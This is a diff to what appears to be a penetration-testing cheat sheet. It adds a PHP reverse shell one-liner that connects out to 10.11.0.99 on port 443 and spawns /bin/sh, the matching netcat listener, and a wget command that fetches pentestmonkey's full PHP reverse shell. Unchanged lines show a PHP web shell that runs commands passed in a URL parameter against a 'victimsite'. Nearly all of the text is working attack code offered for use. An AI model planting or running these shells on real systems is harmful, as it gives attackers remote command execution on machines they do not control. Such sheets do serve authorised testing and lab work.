@@ -123,14 +123,23 @@ TODO: USAGE
 		```
 		nc -nlvp 443
 		```
+	* php no shell exec on linux
+		```
+		<?php $sock = fsockopen("10.11.0.99",443);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
+		```
 
+		Set up listener
+		```
+		nc -nlvp 443
+		```
 	* Windows
 		```
 		<?php echo(system($_GET["cmd"])); ?>
 		```
 		Go to http://victimsite.com/test.php?cmd=dir for command execution 
-
 	* [Other languages/compabibility](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+	* [Full shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+		* wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 * Hosting a shell
 	* Python Web Server
 	```
